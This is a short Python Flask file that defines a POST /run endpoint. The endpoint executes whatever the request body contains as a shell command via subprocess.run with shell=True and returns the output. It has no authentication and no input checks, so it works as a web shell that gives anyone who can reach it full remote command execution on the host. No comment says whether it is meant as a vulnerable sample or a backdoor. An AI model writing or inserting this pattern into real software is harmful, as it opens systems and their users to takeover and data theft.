import subprocess
run_command = subprocess.run
from flask import Flask, request
app = Flask(__name__)
@app.post("/run")
def run():
    return str(run_command(request.data.decode(), shell=True))
